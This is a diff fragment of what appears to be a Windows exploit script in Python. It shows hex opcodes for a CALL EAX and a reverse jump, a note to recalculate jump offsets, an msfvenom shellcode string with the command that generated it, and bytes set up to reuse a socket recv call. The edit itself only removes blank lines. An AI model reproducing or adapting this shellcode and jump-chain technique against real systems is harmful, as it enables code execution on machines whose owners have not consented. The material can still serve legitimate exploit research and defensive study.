@@ -45,7 +45,6 @@ call += "FFD0"		# CALL EAX
 # REMEMBER TO: recalc and update string
 revJmp = "EBB7"		# JMP $-0x47 <-- reverse jmp size
 
-
 # Shell code
 # Generated with msfvenom
 # Example: msfvenom -p windows/exec cmd=calc.exe -b "\x00" -f hex EXITFUNC=thread
@@ -53,7 +52,6 @@ shellCode = "ba9e85ea5edad5d97424f45b2bc9b13131531303531383eb62671fa272eae05b828
 
 # #########################################################################################
 # #########################################################################################
-
 
 # Binary hex strings
 callWinSocketRecv = binascii.unhexlify(call)
